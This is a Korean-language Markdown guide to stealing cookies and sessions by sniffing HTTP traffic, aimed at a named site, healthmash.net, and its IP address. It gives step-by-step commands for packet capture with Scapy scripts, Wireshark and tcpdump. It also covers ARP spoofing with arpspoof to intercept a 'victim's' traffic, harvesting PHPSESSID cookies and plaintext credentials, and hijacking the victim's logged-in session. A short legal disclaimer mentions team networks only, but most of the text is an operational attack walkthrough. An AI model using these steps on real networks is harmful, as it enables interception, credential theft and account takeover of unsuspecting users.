# Network Sniffing - 쿠키/세션 탈취 가이드

**HTTP 트래픽 스니핑으로 쿠키 훔치기**

Target: **http://healthmash.net (54.180.32.176)**

---

## 📋 준비물

1. **Scapy 설치**
```bash
pip3 install scapy
```

2. **관리자 권한** (패킷 캡처에 필요)
```bash
sudo python3 network_sniffer.py
```

3. **같은 네트워크에 있어야 함**
   - WiFi 같은 네트워크
   - 또는 ARP Spoofing으로 중간자 공격

---

## 🚀 사용 방법

### 방법 1: 실시간 패킷 캡처

#### 기본 사용:
```bash
sudo python3 network_sniffer.py
```

#### 특정 인터페이스 지정:
```bash
# 인터페이스 확인
ifconfig

# en0 인터페이스로 캡처 (MacOS WiFi)
sudo python3 network_sniffer.py -i en0

# eth0 인터페이스로 캡처 (Linux)
sudo python3 network_sniffer.py -i eth0
```

#### 특정 도메인 필터링:
```bash
sudo python3 network_sniffer.py -d healthmash.net
```

**캡처 내용:**
- ✅ HTTP 쿠키 (PHPSESSID)
- ✅ 로그인 Credentials (username/password)
- ✅ Authorization 헤더
- ✅ POST 데이터

**저장 파일:**
- `captured_cookies.txt` - 쿠키 목록
- `captured_credentials.txt` - 로그인 정보

---

### 방법 2: PCAP 파일 분석 (Wireshark)

Wireshark로 이미 캡처한 파일이 있다면:

```bash
python3 pcap_analyzer.py capture.pcap
```

특정 도메인만 분석:
```bash
python3 pcap_analyzer.py capture.pcap -d healthmash.net
```

**저장 파일:**
- `extracted_sessions.txt` - 세션 ID 목록
- `extracted_credentials.txt` - Credentials

---

## 🎯 시나리오별 사용법

### 시나리오 1: 같은 WiFi 네트워크
**조건:** 피해자와 같은 WiFi에 연결되어 있음

```bash
# 1. 패킷 캡처 시작
sudo python3 network_sniffer.py

# 2. 피해자가 http://healthmash.net 접속하면
#    자동으로 쿠키 캡처됨!

# 3. Ctrl+C로 중지

# 4. 결과 확인
cat captured_cookies.txt
```

---

### 시나리오 2: Wireshark 사용
**조건:** Wireshark 설치되어 있음

```bash
# 1. Wireshark 실행
sudo wireshark

# 2. 인터페이스 선택 (en0, eth0 등)

# 3. 필터 적용:
http and tcp.port == 80

# 4. 캡처 시작

# 5. 피해자가 healthmash.net 접속 대기

# 6. 캡처 중지 후 .pcap 파일 저장

# 7. Python으로 분석
python3 pcap_analyzer.py capture.pcap
```

**Wireshark 필터 예시:**
```
# HTTP 트래픽만
http

# 특정 호스트
http.host == "healthmash.net"

# Cookie 헤더만
http.cookie

# POST 요청만
http.request.method == "POST"
```

---

### 시나리오 3: tcpdump 사용 (가벼운 대안)

```bash
# 1. 패킷 캡처
sudo tcpdump -i en0 -w capture.pcap 'tcp port 80'

# 2. 피해자 접속 대기 (1-2분)

# 3. Ctrl+C로 중지

# 4. Python으로 분석
python3 pcap_analyzer.py capture.pcap
```

---

## 🔧 고급: ARP Spoofing (중간자 공격)

**다른 사람의 트래픽도 캡처하려면:**

### 1. arpspoof 설치 (MacOS)
```bash
brew install dsniff
```

### 2. IP 포워딩 활성화
```bash
# MacOS
sudo sysctl -w net.inet.ip.forwarding=1

# Linux
sudo sysctl -w net.ipv4.ip_forwarding=1
```

### 3. ARP Spoofing 시작
```bash
# 피해자 IP를 라우터로 속이기
sudo arpspoof -i en0 -t [피해자IP] [게이트웨이IP]

# 예시:
sudo arpspoof -i en0 -t 192.168.1.100 192.168.1.1
```

### 4. 다른 터미널에서 패킷 캡처
```bash
sudo python3 network_sniffer.py -i en0
```

### 5. 완료 후 정리
```bash
# arpspoof 중지 (Ctrl+C)

# IP 포워딩 비활성화
sudo sysctl -w net.inet.ip.forwarding=0
```

⚠️ **주의:** ARP Spoofing은 팀 네트워크에서만 사용하세요!

---

## 📊 결과 해석

### 캡처 성공 예시:
```
[*] HTTP Request 캡처
    Host: healthmash.net
    Path: /index.php
    🍪 Cookie: PHPSESSID=abc123xyz789
    ✓ PHPSESSID: abc123xyz789
    ✓ Source IP: 192.168.1.100
```

### 이 세션 ID로 하이재킹:
```bash
# 브라우저 개발자 도구 (F12)
# Application > Cookies > healthmash.net
# PHPSESSID 값을 abc123xyz789로 변경
# 페이지 새로고침 → 로그인됨!
```

---

## 🎓 실전 팁

### 1. HTTP vs HTTPS
- ✅ **HTTP**: 쿠키가 평문으로 전송 → 스니핑 가능!
- ✗ **HTTPS**: 암호화됨 → 스니핑 불가능

healthmash.net이 HTTP라면 쿠키 탈취 가능!

### 2. 같은 네트워크 확인
```bash
# 게이트웨이 확인
netstat -rn | grep default

# 같은 서브넷의 장치들 스캔
sudo nmap -sn 192.168.1.0/24
```

### 3. 캡처 최적화
```bash
# 불필요한 패킷 필터링
sudo tcpdump -i en0 -w capture.pcap 'tcp port 80 and host healthmash.net'
```

### 4. 대용량 캡처
```bash
# 파일 크기 제한 (100MB마다 새 파일)
sudo tcpdump -i en0 -w capture.pcap -C 100 'tcp port 80'
```

---

## ⚙️ 문제 해결

### "Permission denied" 오류
```bash
# sudo 권한 필요
sudo python3 network_sniffer.py
```

### "No module named 'scapy'"
```bash
pip3 install scapy
```

### 패킷이 캡처 안됨
```bash
# 1. 인터페이스 확인
ifconfig

# 2. 올바른 인터페이스 지정
sudo python3 network_sniffer.py -i en0

# 3. 필터 제거 (모든 HTTP 트래픽)
# network_sniffer.py 코드에서 filter 수정
```

### HTTPS 트래픽만 있음
```bash
# healthmash.net이 HTTPS로 리다이렉트하는지 확인
curl -I http://healthmash.net

# HTTP로 강제 접속
curl http://healthmash.net --insecure
```

---

## 🎯 공격 성공 조건

1. ✅ healthmash.net이 **HTTP** (HTTPS 아님)
2. ✅ 피해자와 **같은 네트워크**
3. ✅ **sudo 권한** 있음
4. ✅ 피해자가 사이트에 **접속 중**

**모든 조건이 충족되면 거의 100% 쿠키 탈취 성공!**

---

## 📞 다음 단계

### 쿠키 획득 후:
1. 브라우저 쿠키 교체
2. 피해자 계정으로 로그인
3. 세션 하이재킹 성공!

### 추가 공격:
- Credentials 획득 → 직접 로그인
- POST 데이터 분석 → 취약점 발견
- 트래픽 패턴 분석 → 행동 모방

---

## ⚠️ 법적 주의사항

- 팀 소유 네트워크에서만 사용
- 무단 스니핑은 불법
- 교육 목적으로만 사용
- 테스트 후 IP 포워딩 비활성화

---

## 📚 참고 자료

### Wireshark 사용법:
- [Wireshark 공식 문서](https://www.wireshark.org/docs/)
- HTTP 필터: `http.cookie contains "PHPSESSID"`

### Scapy 문서:
- [Scapy 공식 문서](https://scapy.readthedocs.io/)
- HTTP 패킷 분석 예제

### ARP Spoofing:
- [ettercap](https://www.ettercap-project.org/) - GUI MITM 도구
- [bettercap](https://www.bettercap.org/) - 현대적인 MITM 프레임워크
